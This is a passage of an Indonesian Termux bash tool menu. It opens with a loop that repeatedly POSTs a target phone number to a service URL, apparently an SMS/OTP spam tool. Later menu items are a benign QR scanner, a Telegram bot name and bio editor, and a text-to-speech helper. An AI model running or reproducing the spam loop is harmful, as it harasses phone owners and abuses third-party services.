⠀⠀⠀⠀⠀⣀⣤⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠈⠻⡄⠁⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠈⠙⠻⣿⣆⠀⠀⠀⠀
⠀⠀⠀⠀⢰⣿⣿⣿⣿⡿⠛⠉⠉⠉⠛⠛⠛⠛⠋⠁⠀⠀⠀⠁⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠈⠙⢧⠀⠀⠀
⠀⠀⠀⠀⠀⠙⠿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠙⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⢹⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠋⠁⠀⠀⠀⠀⠈⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠟⠛⢋⣩⡿⠿⠿⠟⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠁⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⣄⣀⡀⠀⠀⠀⠀⠀⠐⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⠻⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠻⢿⣶⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⣿⣿⣿⣿⣿⣿⣿⣿⡄⠙⢿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠠⣤⣀⠀⠀⠀⠠⣄⣀⣀⡉⢻⣿⣿⣿⣶⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣦⣤⣤⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀
⠀⢻⡟⠙⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠋⠉⠀⠀⢀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⠀⠃⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣶⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠀⠀⠀⠀⠈⠉⠻⢿⣿⣿⣿⣷⡄⠀
⠀⠀⠀⠀⢸⣿⣿⡟⠙⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠛⠛⣿⣿⣿⣿⣿⣧⣀⣀⡄⠀⠀⠀⠀⠀⠀⠈⣿⡿⣿⣿⣷⠀
⠀⠀⠀⠀⢸⣿⡿⠁⠀⠀⠀⠙⠻⠿⣟⠻⢿⣿⣿⣿⣷⣦⡀⠀⠈⠻⢿⣿⣿⣭⣉⡉⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠸⣿⣿⡄
⠀⠀⠀⠀⣸⡟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣦⡀⠀⠀⠀⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠁
⠀⠀⠀⠠⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡟⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠟⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁
" | lolcat
echo -e "${r} JIKA ANDA INGIN MENGHINTIKANNYA TEKAN ${c}[ ${y}CTRL + Z ${c}]"
echo -e "${r} SCRIPT AKAN BERHENTI OTOMATIS"
echo ""
echo -e "${p} Development ${g}: ${c}By.Thonxyzz404" 
echo ""
}
echo ""
clear
run() {
ctrl_z() {
echo ""
echo -e "${r}[!] Script Berhenti !"
echo ""
sleep 3
exit 1
}
trap ctrl_c INT
while true; do
emojis=(
"🤬"
"🥶"
"😈"
"🥵"
"🤨"
"😆"
)
randomIndex=$(( RANDOM % ${#emojis[@]} ))
clear
banner_skill
echo -e "${r}[${g} Pengiriman No${c} : ${y}$nomor_telepon ${r}]${c}"
echo ""
response=$(curl -s "$url" -d "phone=$nomor_telepon")
response &> /dev/null | printf "\r By.Thonxyzz404 ${emojis[$randomIndex]}\n"
echo ""
read -t 5 -p "" user_input
if [[ $user_input == "q" ]]; then
echo -e "${r}[!] Script Dihentikan oleh Pengguna."
echo ""
sleep 3 
break
fi
done
}
clear
banner_skill
echo -e "${y}"
read -p "Masukkan nomor telepon (contoh: 628): " nomor_telepon
run
echo ""
echo -e "${cyan}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
 ;;
    37)
       echo ""
       mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
       echo -e "${cyan} Anda Memilih Menu Hacking...!!"
       echo ""
       echo -e "${red} VIP UNLOCK...!!"
       sleep 2
       clear 
g='\033[32;1m'
c='\033[36;1m'
r='\033[31;1m'
y='\033[33;1m'
w='\033[37;1m'
b='\033[34;1m'
if ! command -v zbarimg &> /dev/null; then
    clear
    echo ""
    echo -e "${r}[ ${g}! ${r}]${c} Installing Packages..!!${w}"
    sleep 2
    echo -e "${n}"
    echo -e "${y}pkg install zbar file lolcat -y${w}"
    pkg install zbar file lolcat -y
else
    clear 
    echo ""
    echo -e "${g}Package sudah terinstall..!!"
    sleep 3
fi
clear
echo ""
echo "
 ██████╗ ██████╗ 
██╔═══██╗██╔══██╗
██║   ██║██████╔╝
██║▄▄ ██║██╔══██╗
╚██████╔╝██║  ██║
 ╚══▀▀═╝ ╚═╝  ╚═╝
Develop : Thonxyzz404
Tools : QR Code Scanner
Platform : Termux" | lolcat
echo ""
read -p "Masukkan path gambar QR : " img
img=$(echo "$img" | sed "s/^['\"]//;s/['\"]$//")
echo ""
if [ ! -f "$img" ]; then
    echo -e "${r}[ ${c}ERROR ${r}]${y} File tidak ditemukan..!!"
    echo -e "${y}Cek path : $img"
    echo ""
fi
if ! file "$img" | grep -E -q "image|bitmap|JPEG|PNG|GIF"; then
    echo -e "${r}[ ${c}ERROR ${r}]${y} File bukan gambar yang valid..!!"
    echo ""
fi
echo -e "${r}[ ${g}INFO ${r}]${c} Memulai proses decode QR Code..!!"
echo -e "${r}[ ${g}FILE ${r}]${w} $img"
echo -e "${r}[ ${g}WAKTU ${r}]${c} $(date '+%H:%M:%S %d-%m-%Y')"
echo ""
echo -e "${r}[ ${g}SCAN ${r}]${y} Scanning QR Code..!!"
hasil=$(zbarimg --quiet --raw "$img" 2>/dev/null)
exit_code=$?
if [ $exit_code -eq 0 ] && [ -n "$hasil" ]; then
    echo -e "${r}[ ${g}SUKSES ${r}]${g} QR Code berhasil dibaca!"
    echo ""
    file_info=$(file -b "$img")
    echo -e "${r}[ ${g}JENIS ${r}]${c} $file_info"
    echo ""
    if [[ "$hasil" =~ ^https?:// ]]; then
        tipe="URL/Link"
        warna=$g
    elif [[ "$hasil" =~ @ ]] && [[ "$hasil" =~ \. ]]; then
        tipe="Email"
        warna=$c
    elif [[ "$hasil" =~ ^\+[0-9]+$ ]] || [[ "$hasil" =~ ^tel: ]]; then
        tipe="Nomor Telepon"
        warna=$b
    elif [[ "$hasil" =~ BEGIN:VCARD ]]; then
        tipe="Kontak (vCard)"
        warna=$y
    elif [[ "$hasil" =~ WIFI: ]]; then
        tipe="Koneksi WiFi"
        warna=$g
    elif [[ "$hasil" =~ ^[0-9]+$ ]] && [ ${#hasil} -gt 8 ]; then
        tipe="Kode/Nomor"
        warna=$w
    else
        tipe="Teks Biasa"
        warna=$w
    fi
    echo -e "${r}[ ${g}TIPE ${r}]${warna} $tipe"
    echo -e "${r}[ ${g}DATA ${r}]${w} $hasil"
    echo ""
    if [[ "$hasil" =~ ^https?:// ]]; then
        echo -e "${r}[ ${g}OPSI ${r}]${y} Mau buka link? (y/n) : ${w}"
        read -n 1 buka
        if [[ $buka == "y" || $buka == "Y" ]]; then
            echo ""
            echo -e "${r}[ ${g}BUKA ${r}]${c} Membuka link..!!"
            am start --user 0 -a android.intent.action.VIEW -d "$hasil" 2>/dev/null
            if [ $? -ne 0 ]; then
                echo -e "${r}[ ${g}LINK ${r}]${y} $hasil"
            fi
        fi
        echo ""
    fi
else
    echo -e "${r}[ ${g}GAGAL ${r}]${y} Tidak ada QR code terdeteksi"
    echo ""
    echo -e "${r}[ ${g}TIPS ${r}]${y} Penyebab gagal:"
    echo -e "${y}• Gambar blur/rusak"
    echo -e "${y}• QR code terlalu kecil"
    echo -e "${y}• Format tidak didukung"
    echo -e "${y}• Pencahayaan buruk"
    echo ""
    echo -e "${r}[ ${g}SOLUSI ${r}]${c} Coba gambar yang lebih jelas!"
    echo ""
fi
echo ""
echo -e "${red}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
    ;;
 38)
       echo ""
       mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
       echo -e "${cyan} Anda Memilih Menu Hacking...!!"
       echo ""
       echo -e "${red} VIP UNLOCK...!!"
       sleep 2
       clear
       cd
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
p='\033[35;1m'
n='\033[0m'
BOLD_RED_BG='\033[101m'
show_error() {
    echo -e "${r}❌ $1${n}"
    echo -e "\n${BOLD_RED_BG}${g}Silahkan Enter Untuk Kembali${n}"
    read
}
clear 
echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⣴⠞⠋⠁⣀⣠⣴⣶⣾⣿⣷⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠆
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⠟⢻⣧⣤⣴⣿⠿⠋⠁⣴⡿⠿⢿⣿⣿⣿⣷⣶⣶⣶⣶⡶⠶⠚⠁⠀⠀⣠⣾⠏⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣴⣾⣿⣥⣤⣤⣭⣍⣁⡀⠀⠀⠘⣿⣇⠀⠀⠀⠈⠉⠉⠉⠉⠀⠀⠀⠀⢀⣠⣴⣿⠟⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣤⡶⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠘⢿⣷⣦⣄⣀⣀⣀⣀⣀⣤⣤⣶⣾⣿⡿⠛⠁⠀⠀⢀⡀
⠀⠀⠀⠀⠀⠀⠀⣠⡾⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠙⠛⠛⠛⠛⠛⣩⣿⠿⠋⠁⠀⠀⣠⣶⠟⠋⠀
⠀⠀⠀⠀⠀⢠⡾⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢄⠀⠀⠀⠀⣼⣿⠁⠀⠀⠀⢠⣾⡿⠃⠀⠀⠀
⠀⠀⠀⠀⣠⡟⡡⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠸⣿⣄⠀⢀⣴⣿⣿⠁⠀⠀⠀⠀
⠀⠀⠀⢠⡟⡜⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⠀⠀⠀⠀⠀⢀⣤⠶⠒⠛⠛⠒⠲⢤⡀⠀⠘⣷⠀⠀⠀⠙⠻⠿⠿⢿⣿⠇⠀⠀⠀⠀⠀
⠀⣠⡶⠿⢇⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⢀⡴⢪⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠙⢄⠀⢹⡄⠀⠀⠀⠀⠀⢀⣿⡟⠀⠀⠀⠀⠀⠀
⠀⠙⢷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⠿⣦⣤⡞⣰⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⡄⠀⡇⠀⠀⠀⢀⣠⣾⠟⢠⠀⠀⠀⠀⠀⠀
⠀⠀⠀⡟⣿⣆⢀⠀⠀⠀⠀⠀⣠⠾⠕⠉⢉⣉⠀⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠃⠀⣠⣶⣿⠟⠋⢀⣾⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢰⣿⣿⣯⣧⠠⠮⠴⠞⣁⣠⣴⣾⣿⣿⣷⡌⣿⠋⠉⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⡟⠉⠀⠀⣠⣾⡏⠀⠀⠀⠀⠀⠀
⠀⣠⠴⢾⣿⣿⣿⣿⠀⠳⣾⣿⣿⣿⣿⣿⣿⣿⣿⡇⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣷⣤⣴⣾⣿⠟⠀⠀⠀⠀⠀⠀⠀
⢰⠁⠀⠀⠙⣿⣿⣧⠈⡆⢻⢿⣿⣿⣿⣿⣿⠿⠟⣃⣀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠂⣼⠀⢈⣩⣽⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀
⣞⠀⠀⠀⣠⣿⣿⡿⠀⢺⡀⢑⡈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠈⠻⣦⡞⠀⠀⠀⠀⠀⢠⣮⣾⣿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢻⣦⣄⣴⡿⡿⠷⣿⠠⣀⡨⠥⣞⣳⡄⠀⢀⡀⠀⠀⠀⠀⠀⣀⣿⣇⠀⠀⠀⣀⣴⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠉⢻⠇⠀⠀⠀⠈⠣⠀⠀⠀⠀⢀⡽⣷⣄⡈⠉⠉⠀⠀⣊⣽⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠉⡴⣫⣿⣿⣒⡢⢄⣠⡾⠋⠉⠉⠛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢸⠛⣷⣤⢀⡄⢀⠇⣠⠂⣸⣡⣚⣼⠋⠁⠀⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠘⣾⡀⡏⠙⡗⠻⠟⢻⠚⢻⢹⠙⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠓⠧⠴⣇⣴⣄⢼⣤⠟⠚⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
" | lolcat 
echo ""
echo -e "${p} Pengembangan ${g}: ${c}By.Thonxyzz404 && By.Byexe"
echo ""
echo -e "${c}====================================================="
echo -e "${r}     CONTROLL BOTZ TELEGRAM ALL,IN BIO & USER"
echo -e "${c}====================================================="
echo -e "${r}     [ ${g}01 ${r}]${y} Ubah nama bio botz."
echo -e "${r}     [ ${g}02 ${r}]${y} Ubah nama user botz."
echo -e "${r}     [ ${g}03 ${r}]${y} Kembali ke awall"
echo -e "${p}====================================================="
echo -e "${g}"
read -p ">>>>>>>> Masukkan pilihan anda : " kuy
case $kuy in
1|01)
echo ""
echo -ne "${g}─(${r}?${g})─${r} Masukkan Token Bot Telegram ${g}: ${y}"
read TOKEN
url_getme="https://api.telegram.org/bot${TOKEN}/getMe"
response=$(curl -s "$url_getme")
if [[ $(echo "$response" | jq -r '.ok') == "true" ]]; then
    bot_id=$(echo "$response" | jq -r '.result.id')
    bot_username=$(echo "$response" | jq -r '.result.username')
    bot_first_name=$(echo "$response" | jq -r '.result.first_name // "(Tidak ada)"')
    clear
    echo -e "${c}
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
"⠀⠀
    echo -e "\n${BOLD_RED_BG}${g}=====[ INFORMASI TOKEN BOT ]=====${n}\n"
    echo -e "${g}─(${r}Id Bot${g})─${y} : ${r}${bot_id}${n}"
    echo -e "${g}─(${r}Username Bot${g})─${y} : ${r}@${bot_username}${n}"
    echo -e "${g}─(${r}Nama Bot${g})─${y} : ${r}${bot_first_name}${n}"
    url_getbio="https://api.telegram.org/bot${TOKEN}/getMyShortDescription"
    response_bio=$(curl -s "$url_getbio")
    if [[ $(echo "$response_bio" | jq -r '.ok') == "true" ]]; then
        old_bio=$(echo "$response_bio" | jq -r '.result.short_description // "(Belum ada bio)"')
        echo -e "${g}─(${r}Bio Lama${g})─${y} : ${r}${old_bio}${n}"
    else
        echo ""
        echo -e "${r}⚠️ Gagal mengambil bio lama : $(echo "$response_bio" | jq -r '.description // "Unknown error"')${n}"
        old_bio=""
        echo ""
    fi
    new_bio=""
    while [[ -z "$new_bio" ]]; do
        echo -ne "\n${g}─(${r}?${g})─ Masukkan Bio Baru${g} : ${y}"
        read -r new_bio
        if [[ -z "$new_bio" ]]; then
            echo ""
            echo -e "${r}⚠️ Bio baru tidak boleh kosong.Coba lagi!${n}"
            echo ""
        fi
    done
    url_setbio="https://api.telegram.org/bot${TOKEN}/setMyShortDescription"
    response_set=$(curl -s -X POST "$url_setbio" -d "short_description=$new_bio")
    if [[ $(echo "$response_set" | jq -r '.ok') == "true" ]]; then
        echo -e "\n${g}[ ${c}✓ ${g}]${r} Bio Bot Berhasil Diubah Menjadi :${y} ${new_bio}${n}"
        echo -e "\n${BOLD_RED_BG}${g}Silahkan Enter Untuk Kembali.${n}"
        read
    else
        echo ""
        show_error "Gagal mengubah bio bot : $(echo "$response_set" | jq -r '.description // "Unknown error"')"
        echo ""
    fi
else
    echo ""
    show_error "Token tidak valid atau API error : $(echo "$response" | jq -r '.description // "Unknown error"')"
    echo ""
fi
;;
2|02)
echo ""
echo -ne "${g}─(${r}?${g})─${r} Masukkan Token Bot Telegram${g} :${y} "
read -r TOKEN
url_getme="https://api.telegram.org/bot${TOKEN}/getMe"
response=$(curl -s "$url_getme")
ok=$(echo "$response" | jq -r '.ok')
if [[ "$ok" == "true" ]]; then
    bot_id=$(echo "$response" | jq -r '.result.id')
    bot_username=$(echo "$response" | jq -r '.result.username')
    bot_name=$(echo "$response" | jq -r '.result.first_name')
    clear
echo -e "${y}
    ⠀⠀⠀⠀⠀⢀⣤⣶⣶⠖⠀⠀⠲⣶⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠋⠀⠀⠀⠀⠀⠀⠙⢿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢻⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣷⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣿⣇⣤⠶⠛⣛⣉⣙⡛⠛⢶⣄⣸⣿⣿⣿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣀⣿⣿⣿⡟⢁⣴⣿⣿⣿⣿⣿⣿⣦⡈⢿⣿⣿⣿⣀⡀⠀⠀⠀⠀
⠀⠀⢠⣴⣿⣿⣿⣿⡟⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡌⢿⣿⣿⣿⣿⣦⡄⠀⠀
⠀⣴⣿⣿⡿⠿⢛⣻⡇⢸⡟⠻⣿⣿⣿⣿⣿⡿⠟⢻⡇⣸⣛⡛⠿⣿⣿⣿⣦⠀
⢸⣿⡿⠋⠀⠀⢸⣿⣿⡜⢧⣄⣀⣉⡿⣿⣉⣀⣠⣼⢁⣿⣿⡇⠀⠀⠙⢿⣿⡆
⣿⣿⠁⠀⠀⠀⠈⣿⣿⡇⣿⡿⠛⣿⣵⣮⣿⡟⢻⡿⢨⣿⣿⠀⠀⠀⠀⠈⣿⣿
⢿⡟⠀⠀⠀⠀⠀⠘⣿⣷⣤⣄⡀⣿⣿⣿⣿⢁⣤⣶⣿⣿⠃⠀⠀⠀⠀⠀⣿⡟
⠘⠇⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡇⢿⣿⣿⣿⢸⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠻⠃
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⢩⣦⣘⡘⠋⣛⣸⡍⠁⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⠀⠘⢿⣷⣤⣤⣄⣤⣤⣶⣿⣿⣿⡿⢿⣿⣿⣿⣷⣤⣤⣠⣤⣴⣾⡿⠁⠀⠀
⠀⠀⠀⠀⠉⠛⠿⠿⠿⡿⠿⠿⠛⠉⠀⠀⠉⠛⠿⠿⣿⠿⠿⠿⠛⠉⠀⠀
"⠀⠀
    echo -e "\n${BOLD_RED_BG}${g}=====INFORMASI TOKEN BOT=====${n}\n"
    echo -e "${g}─(${r}Id Bot${g})─${y} : ${g}─(${r}${bot_id}${g})─"
    echo -e "${g}─(${r}Username Bot${g})─${y} : ${g}─(${r}@${bot_username}${g})─"
    echo -e "${g}─(${r}Nama Bot${g})─${y} : ${g}─(${r}${bot_name:-'(Tidak ada)'}${g})─"
    new_name=""
    while [[ -z "$new_name" ]]; do
        echo -ne "\n${g}─(${r}?${g})─${r} Masukkan Nama Baru${g} :${y} "
        read -r new_name
        if [[ -z "$new_name" ]]; then
            echo ""
            echo -e "${bg_red}${g}Ga Boleh Kosong Namanya${n}"
            echo ""
        fi
    done
    url_setname="https://api.telegram.org/bot${TOKEN}/setMyName"
    response_set=$(curl -s -X POST -d "name=${new_name}" "$url_setname")
    ok_set=$(echo "$response_set" | jq -r '.ok')
    if [[ "$ok_set" == "true" ]]; then
        echo -e "\n${g}─(${r}!${g})─${r} Nama Bot Berhasil Diubah Menjadi ${y}${new_name}${n}"
        read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
        echo ""
    else
        clear 
        echo ""
        echo -e "${r}❌ Gagal mengubah nama bot : $response_set"
        echo ""
        read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
    fi
else
    clear 
    echo ""
    echo -e "${r}❌ Token tidak valid atau API error : $response"
    echo ""
    read -p $'\n\033[101m\033[1;32mSilahkan Enter Untuk Kembali\033[0m' _
fi
;;
   3|03)
        clear
        ;;
    *)
        clear 
        echo ""
        echo -e "${r}Pilihan Anda Tidak Valid."
        ;;
esac
echo ""
echo -e "${cyan}Tekan Enter Untuk Kembali ke Toolsv8!!!"
read -n 1 -s -r -p "Silahkan Tekan Enter...!!"
clear
   ;;
39)
       echo ""
       mpv --no-video --quiet "$HOME/Goblok/oke.mp3" &> /dev/null &
       echo -e "${cyan} Anda Memilih Menu Hacking...!!"
       echo ""
       echo -e "${red} VIP UNLOCK...!!"
       sleep 2
       clear
g='\033[32;1m'
r='\033[31;1m'
y='\033[33;1m'
c='\033[1;36m'
n='\033[0m'
if ! command -v python &> /dev/null; then
    clear
    echo ""
    echo -e "${c}Python belum terinstall. Menginstall...!!"
    echo -e "${n}"
    pkg install -y python
fi
if ! command -v pip &> /dev/null; then
    clear 
    echo ""
    echo -e "${c}Pip belum terinstall. Menginstall...!!"
    echo -e "${n}"
    pkg install -y python-pip
fi
if ! command -v gtts-cli &> /dev/null; then
    clear 
    echo ""
    echo -e "${c}gTTS belum terinstall. Menginstall...!!"
    pip install gTTS
    clear
fi
echo "
███████╗ ██████╗ ██╗   ██╗███╗   ██╗██████╗ 
██╔════╝██╔═══██╗██║   ██║████╗  ██║██╔══██╗
███████╗██║   ██║██║   ██║██╔██╗ ██║██║  ██║
╚════██║██║   ██║██║   ██║██║╚██╗██║██║  ██║
███████║╚██████╔╝╚██████╔╝██║ ╚████║██████╔╝
╚══════╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═══╝╚═════╝
       Development : By.Thonxyzz404" | lolcat
echo -e "${g}"
read -p "Masukkan teks yang ingin menjadi sound : " teks
echo "$teks" > teks.txt
gtts-cli -f teks.txt -l id -o /sdcard/Download/Google.mp3
rm teks.txt
echo ""
